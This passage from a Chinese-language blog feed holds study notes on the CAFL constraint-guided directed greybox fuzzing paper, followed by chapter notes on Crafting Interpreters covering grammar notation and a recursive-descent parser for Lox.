alt="image-20220812102911913"></p><p>这样计算的好处是，如果seed能够cover更多的标准块，那么确实这个距离总和会变少。</p><p>但是我们注意到对于UAF，虽然seedA的DGF距离计算最小，但是它其实并不是理想的UAF触发行为。相反，C才是。然而C的得分却并不高。这正是DGF的<code>independent site</code>所导致的。</p><p>另外一个例子是和数据流有关。如果我们需要访问buf的末尾，这里使用DGF时，由于只需要迭代四次，因此会误认为seedA对应的DGF值最小。但是其实seedC对应的值才是最符合条件的。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812105618876.png" alt="image-20220812105618876"></p><p>为了确保解决上述问题，CGDF定义了新的距离表示方式。当满足以下条件时，CGDF会给出更短的seed距离。</p><ul><li>这个seed满足了更多的constrains</li><li>这个seed和首个unsatisfied constraint距离更近。</li></ul><p>针对以上计算方式</p><p><strong>以UAF作为例子</strong>。看seedA，其距离最先要满足的一个constraint距离是2，并且距离第二个条件%use由于data不满足，距离是MAX。因此结论是MAX+2。</p><p>再看seedB，距离第一个条件最近的块是c块，距离为1，因此未1+MAX。</p><p>再看seedC，第一个条件已经满足，而距离第二个条件距离为1.因此两个加起来就是0+1。这样确实给出了较好的优先级顺序。</p><p><strong>以越界读为例子</strong>，只考虑数据流，也就是越界读的位置和当前读到的位置之差。seedA总共是40，当前读了10，因此CGDF计算的结果是40-10=30，以此类推。</p><p>我们怎么生成constrains?可以直接从core dump中提取。==但是怎么提取网上没有找到好的方法==。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812113604129.png" alt="image-20220812113604129"></p><h3 id="生成constrains"><a href="#生成constrains" class="headerlink" title="生成constrains"></a>生成constrains</h3><ul><li>变量捕获</li></ul><p>一旦我们经过target site，我们会通过变量类型识别一些变量，比方说设置&amp;buf[]为addr，设置L*10为size等。</p><ul><li>数据条件</li></ul><p>是一个boolean表达式，例如alloc.size&lt;=access.addr-alloc.ret这个判断条件。</p><ul><li>顺序</li></ul><p>如果有多个条件需要同时满足，需要对constrains作出一些条件限制。</p><h3 id="constrains的距离"><a href="#constrains的距离" class="headerlink" title="constrains的距离"></a>constrains的距离</h3><ul><li>basic block distance</li></ul><p>对于两个基本块之间的距离可以表示为</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812121743059.png" alt="image-20220812121743059"></p><p>其中Bs是B1的后继，其实也就是类似路由算法的一个方程(名字忘记了)，也就是非常直观的计算基本块之间的距离。</p><ul><li>target site distance</li></ul><p>和之前basic block distance基本一致</p><ul><li>data condition distance</li></ul><p>下面这张图比较明显。其实就是我们定义了一些数据之间的差距。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812122313276.png" alt="image-20220812122313276"></p><p>规则为：对于基本块之间的数据差距。是识别到的所有变量之间的差距之和(但是注意这里的comparison operator需要是一样的)。如果有没有识别到的，那就是无穷大。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812122724630.png" alt="image-20220812122724630"></p><p>对于使用assert标记的数据条件，我们使用pass或者fail表示。</p><p>对于多个数据条件的情况，使用如下公式</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812123241195.png" alt="image-20220812123241195"></p><p>理解：$N_{unsat}$代表所有不满足data condition的条件数量，cdata是一个4byte的数字。并且后面加上了最小的距离值，这样是突出了最近距离的数据的重要性。</p><h3 id="constrains距离总和"><a href="#constrains距离总和" class="headerlink" title="constrains距离总和"></a>constrains距离总和</h3><p>简单来说，综合控制流和数据流的距离，我们把两者的和作为结果。具体来说，在到达target site之前，距离是</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812124503769.png" alt="image-20220812124503769"></p><p>也就是基本块之间的距离+数据流之间的距离。但是此时数据流之间的距离是最大的数据条件距离和所有需要满足的数据条件的数量之和。(也就是一个非常大的值，用最大的距离乘上最多的标准快)</p><p>当到达target site之后，距离变为下图。此时只需要考虑数据流距离。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812124537174.png" alt="image-20220812124537174"></p><p>到最后，变为0就可以了。</p><p>但是注意constrains距离只是其中一个控制流线之下的距离总和。如果我们考虑多个控制流下的总距离，需要用以下公式。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812125102923.png" alt="image-20220812125102923"></p><p>对于三种情况讨论</p><ul><li>当没有限制满足时</li></ul><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812125408120.png" alt="image-20220812125408120"></p><p>此时$\tau$是1，这里的1很有意思，从数据流看出应该是所有需要满足的条件中最近的一个。</p><ul><li>当所有控制流条件满足，并且数据流未满足时，前半部分控制流的$\tau$就是N(B*)因此前半部分没有了，只是计算数据流满足</li></ul><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812141139441.png" alt="image-20220812141139441"></p><h3 id="生成constrains-1"><a href="#生成constrains-1" class="headerlink" title="生成constrains"></a>生成constrains</h3><p>之前提到的生成约束图的方式，在这里是细节。</p><p>对于使用core dump生成constraint的方式，使用模板nT（UAF，double free），或者2T+D(两个target site和一个data，例如heap overflow)，或者1T+D，例如assertion failure或者除0。如下所示</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812142148746.png" alt="image-20220812142148746"></p><p>这里的2T+D的生成方式中的assert的目的是确保access到的地址是在之前分配的地址之间。之后我们通过设置cond来驱使产生溢出。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812174548860.png" alt="image-20220812174548860"></p><p>除此以外，生成constrains还有几个原则</p><ul><li>避免wrapper函数</li></ul><p>使得target site更加有标识性。通过检查函数名中是否包含keyword，类似alloc(),free()等</p><h3 id="利用patch生成constrains"><a href="#利用patch生成constrains" class="headerlink" title="利用patch生成constrains"></a>利用patch生成constrains</h3><p>使用1T+D的模板可以很方便的生成。具体算法如下</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812182354743.png" alt="image-20220812182354743"></p><p>有以下集中生成constrais的规则</p><ol><li>如果引入了新的exception检查，设置<code>target site</code>到其源地址(我理解是exception所检查的地方)并用新的exception检查条件创建<code>data_cond</code>。在这里将throw或者error识别为exception check。</li><li>如果任何分支语句被修改了，设置<code>target_site</code>到被改掉的条件的地方，并根据patch之前和之后互斥的数据条件修改data_cond。也就是下面的公式。个人认为这样设置因为要找到不属于两个条件之间的情况，进行fuzz。</li></ol><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220812192036213.png" alt="image-20220812192036213"></p><ol start="3"><li>如果有变量被修改，设置<code>target site</code>到被修改的变量，创建<code>data_cond</code>并检验修改之前和之后的变量数值是否相同。</li><li>如果上述条件都不满足，则对新增的代码设置为target_site进行修改。</li></ol><h2 id="CAFL实现"><a href="#CAFL实现" class="headerlink" title="CAFL实现"></a>CAFL实现</h2><p>CAFL首先生成LLVM的IR代码，并用AFL编译器来instrument。之后生成call graph以及instrument target site(在编译时加上一些标记checkpoint，指示目前的位置)，并捕获变量，将其转发到CAFL runtime。</p><h3 id="CAFL-runtime"><a href="#CAFL-runtime" class="headerlink" title="CAFL runtime"></a>CAFL runtime</h3><p>CAFL runtime从checkpoint接受目标位置的距离[$\tau$,d($B^{n}$,$B_{\tau}$)]其中$\tau$是限制的下标。d是basic block之间的距离。在target site位置，CAFL runtime接受从checkpoint捕获到的变量，计算data之间的距离(在这里还考虑到放置由于内存回收造成地址偏移发生改变)</p><h2 id="CAFL-fuzzer"><a href="#CAFL-fuzzer" class="headerlink" title="CAFL fuzzer"></a>CAFL fuzzer</h2><p>对于seed选择的策略：</p><ul><li>seed 评分</li></ul><p>按照总长度较短的seed给与更高的分数，同时避免局部最优(没有给出具体方法)</p><ul><li>seed 创建</li></ul><p>也没有给出具体算法。当一个中子覆盖了更多边时，就生成一个新的seed(?)</p><ul><li>seed 最优化选择</li></ul><p>按照seed排名的指数倒数作为当前seed被选中的概率来选择seed。</p><h2 id="四、实验评估"><a href="#四、实验评估" class="headerlink" title="四、实验评估"></a><strong>四、实验评估</strong></h2><h3 id="实验数据结果"><a href="#实验数据结果" class="headerlink" title="实验数据结果"></a><strong>实验数据结果</strong></h3><p>以下是从LAVA1中获取到的制造crash的时间对比。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220813125009029.png" alt="image-20220813125009029"></p><p>以上将CAFL和AFLGo做对比，发现新增data condition的CAFL到达目标地址的时间确实短了许多。</p><p>接下来，寻找crash reproduction时间对比。使用了ASAN和MS。这里比较alpha GO和CAFL在多种目标下的crash reproduction时间，主要是为了验证数据流存在的意义</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220813130309587.png" alt="image-20220813130309587"></p><h3 id="PoC生成"><a href="#PoC生成" class="headerlink" title="PoC生成"></a>PoC生成</h3><p>最后一个是PoC生成功能。使用git和Mercurial可以自动生成constrains</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220813130946883.png" alt="image-20220813130946883"></p><p>上面主要是堆溢出漏洞，使用CAFL的nT+D可以显著加快速度。</p><p>另外对于1T下的数据流对比。</p><p><img src="/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/image-20220813131802831.png" alt="image-20220813131802831"></p><h2 id="现有问题"><a href="#现有问题" class="headerlink" title="现有问题"></a>现有问题</h2><ol><li>论文结尾提到对于栈溢出漏洞可能需要grammar fuzzing进行补充，目前CAFL无法做到。</li><li>对于例如数据未初始化漏洞等和控制流角度关系较小的漏洞，目前CAFL还无法处理。</li><li>对于例如全局缓冲区溢出和buffer负数溢出的bug，</li></ol>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crafting-interpreters4</title>
      <link href="/2022/08/10/crafting-interpreters4/"/>
      <url>/2022/08/10/crafting-interpreters4/</url>
      
        <content type="html"><![CDATA[<p>这一节的关键是parsing interpreters，据说是书中最为重要的部分之一。其实等看完了之后发现，应该就是所谓的优先级转换。看完了这一篇还是对前端解析中优先级的处理有了更深的认识，知道了具体是怎么实现的，甚至可以根据自己的需求，调整运算优先级。</p><span id="more"></span><h1 id="parsing"><a href="#parsing" class="headerlink" title="parsing"></a>parsing</h1><p>parser的目的有两个</p><ul><li>给一个合法的token序列，输出对应的AST（参数树）</li><li>给一个不合法的参数序列，探测其中的error并输出</li></ul><h2 id="设想"><a href="#设想" class="headerlink" title="设想"></a>设想</h2><p>parse的意义在于能够将一个句子(一行由token组成的代码)识别成这个语句由什么部分构成。也就是做和上一章相反的事情。上一章的一部分内容是根据规则生成code，这一部分则是检查code是否符合规则以及将code划分成不同部分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">expression     → literal</span><br><span class="line">               | unary</span><br><span class="line">               | binary</span><br><span class="line">               | grouping ;</span><br><span class="line"></span><br><span class="line">literal        → NUMBER | STRING | <span class="string">&quot;true&quot;</span> | <span class="string">&quot;false&quot;</span> | <span class="string">&quot;nil&quot;</span> ;</span><br><span class="line">grouping       → <span class="string">&quot;(&quot;</span> expression <span class="string">&quot;)&quot;</span> ;</span><br><span class="line">unary          → ( <span class="string">&quot;-&quot;</span> | <span class="string">&quot;!&quot;</span> ) expression ;</span><br><span class="line">binary         → expression operator expression ;</span><br><span class="line">operator       → <span class="string">&quot;==&quot;</span> | <span class="string">&quot;!=&quot;</span> | <span class="string">&quot;&lt;&quot;</span> | <span class="string">&quot;&lt;=&quot;</span> | <span class="string">&quot;&gt;&quot;</span> | <span class="string">&quot;&gt;=&quot;</span></span><br><span class="line">               | <span class="string">&quot;+&quot;</span>  | <span class="string">&quot;-&quot;</span>  | <span class="string">&quot;*&quot;</span> | <span class="string">&quot;/&quot;</span> ;</span><br></pre></td></tr></table></figure><p>parsing中很重要的一件事是处理优先级。例如以下的对于“等式”的表示形式，注意我们通常把优先级较低的放在前面的位置，优先级较高的放在靠后的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">expression     → equality ;</span><br><span class="line">equality       → comparison ( ( <span class="string">&quot;!=&quot;</span> | <span class="string">&quot;==&quot;</span> ) comparison )* ;</span><br><span class="line">comparison     → term ( ( <span class="string">&quot;&gt;&quot;</span> | <span class="string">&quot;&gt;=&quot;</span> | <span class="string">&quot;&lt;&quot;</span> | <span class="string">&quot;&lt;=&quot;</span> ) term )* ;</span><br><span class="line">term           → factor ( ( <span class="string">&quot;-&quot;</span> | <span class="string">&quot;+&quot;</span> ) factor )* ;</span><br><span class="line">factor         → unary ( ( <span class="string">&quot;/&quot;</span> | <span class="string">&quot;*&quot;</span> ) unary )* ;</span><br><span class="line">unary          → ( <span class="string">&quot;!&quot;</span> | <span class="string">&quot;-&quot;</span> ) unary</span><br><span class="line">               | primary ;</span><br><span class="line">primary        → NUMBER | STRING | <span class="string">&quot;true&quot;</span> | <span class="string">&quot;false&quot;</span> | <span class="string">&quot;nil&quot;</span></span><br><span class="line">               | <span class="string">&quot;(&quot;</span> expression <span class="string">&quot;)&quot;</span> ;</span><br></pre></td></tr></table></figure><h2 id="具体算法"><a href="#具体算法" class="headerlink" title="具体算法"></a>具体算法</h2><p>考虑一下，如何将上述equality()变成代码？如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Expr <span class="title function_">equality</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">Expr</span> <span class="variable">expr</span> <span class="operator">=</span> comparison();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (match(BANG_EQUAL, EQUAL_EQUAL)) &#123;</span><br><span class="line">    <span class="type">Token</span> <span class="variable">operator</span> <span class="operator">=</span> previous();</span><br><span class="line">    <span class="type">Expr</span> <span class="variable">right</span> <span class="operator">=</span> comparison();</span><br><span class="line">    expr = <span class="keyword">new</span> <span class="title class_">Expr</span>.Binary(expr, operator, right);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> expr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二行的comparison()代表了上面规则中需要左侧递归解析的comparison。我们把它储存为本地变量。在这之后，我们逐层递归解析表达式，所依据的规则就是上面表中的顺序。</p><p>在equality中我们调用了comparison()，如下所示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">private Expr comparison() &#123;</span><br><span class="line">    Expr expr = term();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">match</span>(GREATER, GREATER_EQUAL, LESS, LESS_EQUAL)) &#123;</span><br><span class="line">        Token operator = previous();</span><br><span class="line">        Expr right = term();</span><br><span class="line">        expr = new Expr.Binary(expr, operator, right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> expr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结构和上面的十分类似，其实根本就是递归地进行下一步解析，注意这里递归最后的结果就是得到两个term，最后合成一个binary表达式。</p><p>term的内容如下，可以看出其实结构都很相似，先左递归，之后获取运算符，再右递归。在term后面是factor，也是完全一样的结构</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Expr <span class="title function_">term</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Expr</span> <span class="variable">expr</span> <span class="operator">=</span> factor();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (match(MINUS, PLUS)) &#123;</span><br><span class="line">        <span class="type">Token</span> <span class="variable">operator</span> <span class="operator">=</span> previous();</span><br><span class="line">        <span class="type">Expr</span> <span class="variable">right</span> <span class="operator">=</span> factor();</span><br><span class="line">        expr = <span class="keyword">new</span> <span class="title class_">Expr</span>.Binary(expr, operator, right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> expr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Expr <span class="title function_">factor</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">Expr</span> <span class="variable">expr</span> <span class="operator">=</span> unary();</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span> (match(SLASH, STAR)) &#123;</span><br><span class="line">     <span class="type">Token</span> <span class="variable">operator</span> <span class="operator">=</span> previous();</span><br><span class="line">     <span class="type">Expr</span> <span class="variable">right</span> <span class="operator">=</span> unary();</span><br><span class="line">     expr = <span class="keyword">new</span> <span class="title class_">Expr</span>.Binary(expr, operator, right);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> expr;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>然后是unary，也就是单目运算符。可以看到这里只匹配一个参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Expr <span class="title function_">unary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (match(BANG, MINUS)) &#123;</span><br><span class="line">        <span class="type">Token</span> <span class="variable">operator</span> <span class="operator">=</span> previous();</span><br><span class="line">        <span class="type">Expr</span> <span class="variable">right</span> <span class="operator">=</span> unary();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Expr</span>.Unary(operator, right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> primary();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后到了primary，也就是最下端的数字，字符串等基本参数。到这里时一定会反向递归上去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Expr <span class="title function_">primary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (match(FALSE)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Expr</span>.Literal(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (match(TRUE)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Expr</span>.Literal(<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (match(NIL)) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Expr</span>.Literal(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (match(NUMBER, STRING)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Expr</span>.Literal(previous().literal);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (match(LEFT_PAREN)) &#123;</span><br><span class="line">        <span class="type">Expr</span> <span class="variable">expr</span> <span class="operator">=</span> expression();</span><br><span class="line">        consume(RIGHT_PAREN, <span class="string">&quot;Expect &#x27;)&#x27; after expression.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Expr</span>.Grouping(expr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意最后会匹配括号。在这里又可能产生一个新的表达式。如果我们发现右侧括号没有，就触发一个错误。</p><p>总结一下，这里主要将一个已经识别为token的代码识别成句法结构。采用的主要方式是递归识别，按照优先级一层一层识别(其实本质上编译器关于优先级的识别方式原理就在这里，按照从前到后的顺序结合为表达式)，直到最底层的整数，字符串或者左括号。</p><p>作为练习，看一下下面的式子</p><blockquote><p>a == b == c == d == e</p></blockquote><p>首先这是一个expression，首先会把他识别为equation（因为等号优先级最低）然后进入comparison()，进入term(),factor(),unary()，然后没有识别到感叹号或者负号，就进入primary()这里会把A的token特性拿出来，判断是数字还是字符串。然后逐层倒着递归上去。一直到equaliyt()中的<code>equal_equal</code>时终止，识别到等号表达式，并<strong>再次递归</strong>。</p><p>一直到最后一个等号，也就是d == e时，可以进入以下代码的第四行，将**刚才得到的表达式结果作为Expr.Binary()**的左侧expr，结合为一个表达式，并且再逐层递归回去。可以看到我们这样得到的优先级就是</p><blockquote><p>(a == (b == (c == (d == e))))</p></blockquote><p>也就是从右向左。这是符合我们预期的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (match(BANG_EQUAL, EQUAL_EQUAL)) &#123;</span><br><span class="line">    <span class="type">Token</span> <span class="variable">operator</span> <span class="operator">=</span> previous();</span><br><span class="line">    <span class="type">Expr</span> <span class="variable">right</span> <span class="operator">=</span> comparison();</span><br><span class="line">    expr = <span class="keyword">new</span> <span class="title class_">Expr</span>.Binary(expr, operator, right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>没看太明白，后续补..</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>从结果上来看，我们确实完成了前端解析的工作。其实最重要的还是上面提到的，将表达式根据优先级转换为抽象参数树。</p><p><img src="/2022/08/10/crafting-interpreters4/image-20220811115759662.png" alt="image-20220811115759662"></p>]]></content>
      
      
      <categories>
          
          <category> interpreter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> interpreter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>crafting-interpreters3</title>
      <link href="/2022/08/07/crafting-interpreters3/"/>
      <url>/2022/08/07/crafting-interpreters3/</url>
      
        <content type="html"><![CDATA[<p>编译器实践第三课，Representing Code</p><p>上一章节我们提到如何把代码作为字符串，识别出对应的变量，关键字，表达式，运算符等，并把它们提取出来。而这一章后面一章，将会把这些token转化为更为复杂的内容。这一章关注的是，关于这些“更为复杂的内容”的定义。</p><span id="more"></span><p>上一章我们着重关注的是<code>lexial grammar</code>也就是词法，而这一张我们将会偏重于<code>context-free grammar</code>。在scanner语法中，字母表是单个字符，而字符串(也叫token)是一个单词。现在我们认为每一个token是字母表，而字母表组成在一起，叫做<code>表达式</code>。</p><p><img src="/2022/08/07/crafting-interpreters3/image-20220807175346391.png" alt="image-20220807175346391"></p><p>一个正式语法的作用手机确定什么字符串时有效的，什么不是。就类似英语里面喷段一个句子的语法结构是否正确一样。(而不是单词拼写是否正确)</p><h1 id="句法语法"><a href="#句法语法" class="headerlink" title="句法语法"></a>句法语法</h1><p>下面用一张图介绍语法。感觉这种构造方式和之前fuzz里面基于语法的fuzzing很类似。例如下面的一个<code>breakfast</code>。其构造方法是第一句所描述的规则。并且如果我们制定引号引起来的是<code>terminal</code>也就是可以不再扩展，我们可以通过逐级拆解每个变量。(例如breakfast拆分成<code>protein</code>，protein拆分成<code>cooked eggs</code>，而cooked拆分成<code>poached</code>等等，以此类推即可)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">breakfast  → protein <span class="string">&quot;with&quot;</span> breakfast <span class="string">&quot;on the side&quot;</span> ;</span><br><span class="line">breakfast  → protein ;</span><br><span class="line">breakfast  → bread ;</span><br><span class="line"></span><br><span class="line">protein    → crispiness <span class="string">&quot;crispy&quot;</span> <span class="string">&quot;bacon&quot;</span> ;</span><br><span class="line">protein    → <span class="string">&quot;sausage&quot;</span> ;</span><br><span class="line">protein    → cooked <span class="string">&quot;eggs&quot;</span> ;</span><br><span class="line"></span><br><span class="line">crispiness → <span class="string">&quot;really&quot;</span> ;</span><br><span class="line">crispiness → <span class="string">&quot;really&quot;</span> crispiness ;</span><br><span class="line"></span><br><span class="line">cooked     → <span class="string">&quot;scrambled&quot;</span> ;</span><br><span class="line">cooked     → <span class="string">&quot;poached&quot;</span> ;</span><br><span class="line">cooked     → <span class="string">&quot;fried&quot;</span> ;</span><br><span class="line"></span><br><span class="line">bread      → <span class="string">&quot;toast&quot;</span> ;</span><br><span class="line">bread      → <span class="string">&quot;biscuits&quot;</span> ;</span><br><span class="line">bread      → <span class="string">&quot;English muffin&quot;</span> ;</span><br></pre></td></tr></table></figure><p>最终得到的结果类似下图。直到我们的所有句子内容都是<code>terminal</code>就终止扩展。</p><p><img src="/2022/08/07/crafting-interpreters3/image-20220807191331259.png" alt="image-20220807191331259"></p><h2 id="句法语法的扩展"><a href="#句法语法的扩展" class="headerlink" title="句法语法的扩展"></a>句法语法的扩展</h2><p>可以参考以下内容。我们可以用问号(问号之前的内容至多出现一次)，星号(出现任意次)，加号(出现至少一次)，竖线(表示选择)来进一步形式化语言。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">breakfast → protein ( <span class="string">&quot;with&quot;</span> breakfast <span class="string">&quot;on the side&quot;</span> )?</span><br><span class="line">          | bread ;</span><br><span class="line"></span><br><span class="line">protein   → <span class="string">&quot;really&quot;</span>+ <span class="string">&quot;crispy&quot;</span> <span class="string">&quot;bacon&quot;</span></span><br><span class="line">          | <span class="string">&quot;sausage&quot;</span></span><br><span class="line">          | ( <span class="string">&quot;scrambled&quot;</span> | <span class="string">&quot;poached&quot;</span> | <span class="string">&quot;fried&quot;</span> ) <span class="string">&quot;eggs&quot;</span> ;</span><br><span class="line"></span><br><span class="line">bread     → <span class="string">&quot;toast&quot;</span> | <span class="string">&quot;biscuits&quot;</span> | <span class="string">&quot;English muffin&quot;</span> ;</span><br></pre></td></tr></table></figure><h2 id="LOX语法的表示"><a href="#LOX语法的表示" class="headerlink" title="LOX语法的表示"></a>LOX语法的表示</h2><p>根据上面的语法规则，对于Lox我们可以使用以下语法表达式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">expression     → literal</span><br><span class="line">               | unary</span><br><span class="line">               | binary</span><br><span class="line">               | grouping ;</span><br><span class="line"></span><br><span class="line">literal        → NUMBER | STRING | <span class="string">&quot;true&quot;</span> | <span class="string">&quot;false&quot;</span> | <span class="string">&quot;nil&quot;</span> ;</span><br><span class="line">grouping       → <span class="string">&quot;(&quot;</span> expression <span class="string">&quot;)&quot;</span> ;</span><br><span class="line">unary          → ( <span class="string">&quot;-&quot;</span> | <span class="string">&quot;!&quot;</span> ) expression ;</span><br><span class="line">binary         → expression operator expression ;</span><br><span class="line">operator       → <span class="string">&quot;==&quot;</span> | <span class="string">&quot;!=&quot;</span> | <span class="string">&quot;&lt;&quot;</span> | <span class="string">&quot;&lt;=&quot;</span> | <span class="string">&quot;&gt;&quot;</span> | <span class="string">&quot;&gt;=&quot;</span></span><br><span class="line">               | <span class="string">&quot;+&quot;</span>  | <span class="string">&quot;-&quot;</span>  | <span class="string">&quot;*&quot;</span> | <span 